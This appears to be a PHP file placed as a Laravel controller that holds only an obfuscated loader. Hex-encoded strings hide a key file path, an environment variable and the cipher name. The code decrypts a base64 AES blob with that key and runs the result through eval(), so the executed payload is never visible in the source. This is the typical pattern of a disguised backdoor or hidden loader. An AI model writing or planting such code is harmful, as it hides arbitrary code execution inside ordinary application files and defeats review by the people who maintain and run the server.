<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('KEE7ru+gBLGbpUzpITDhIQ==');

$c=base64_decode(

'ZVcNQ+5qwSbC+KPuIZcsJJ8aICEKLlceqtCqWEKYQj4FQwBjJFBPRDAdHk2jaiPHkfdvCNJGPE6D' .
'Pz0Z4aECeq2R00jKIi3TmsyDq6In62QwWZHK8jWoBjPWdZ4Sr+EcmCRJd9MElyFQho4njRcFhC/6' .
'5YE17Mr8ZoODgq/YRYbtg24trnPBx96zAZRquKr37YtiuNSV1F3dn+e6HTKagp+OktfSy4zj2KEZ' .
'dloACOs='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

